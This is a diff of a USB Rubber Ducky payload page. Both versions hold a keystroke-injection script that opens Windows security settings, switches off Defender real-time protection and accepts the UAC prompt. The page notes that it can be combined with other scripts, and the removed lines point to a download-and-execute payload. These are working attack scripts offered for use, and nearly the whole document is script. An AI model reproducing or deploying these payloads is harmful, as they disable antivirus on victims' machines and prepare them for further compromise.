@@ -1,43 +1,32 @@
-A ducky script that disables Windows defender, then clears the action center prompt
+# A ducky script that disables Windows Defender Real Time Protection
+## Date : 04-10-2021
 
-NOTE: this is only tested on the windows 10 1607 build, AKA the anniversary edition.
+NOTE: This Code is Tested on Windows 10, 19043.1288 OS Build
 
 Most older machines will probably need more delay
 
 This can be combined with other scripts. 
 
-
-Preview: https://www.youtube.com/watch?v=XTF0U5jN1us
-
-when combined with [[Payload - Windows 10 : Download and execute file with Powershell]]**:** https://www.youtube.com/watch?v=r6vwQ6QJujg
-
 ```
-REM turn off windows defender then clear action center
-REM author:judge2020
-REM You take responsibility for any laws you break with this, I simply point out the security flaw
-REM
-REM start of script
-REM
-REM let the HID enumerate
-DELAY 2000
-ESCAPE
-DELAY 100
-CONTROL ESCAPE
-DELAY 100
-STRING Windows Defender Settings
-ENTER
-DELAY 2000
-REM why TAB and HOME?
-TAB
-DELAY 50
-REM why TAB and HOME?HOME
-DELAY 50
-ALT F4
-DELAY 3200
-REM windows + a = ????
-GUI a 
+REM Author : @krishnachaittanyah
+REM This Script Will Disable Real Time Protection
+REM *********************
+REM We're going to disable Real Time Protection
+REM *********************
+DELAY 1000
+GUI 
 DELAY 500
+STRING virus & threat protection
 ENTER
-DELAY 100
-GUI a
+DELAY 3000
+TAB 
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 200
+SPACE 
+DELAY 3000
+ALT y
 ```
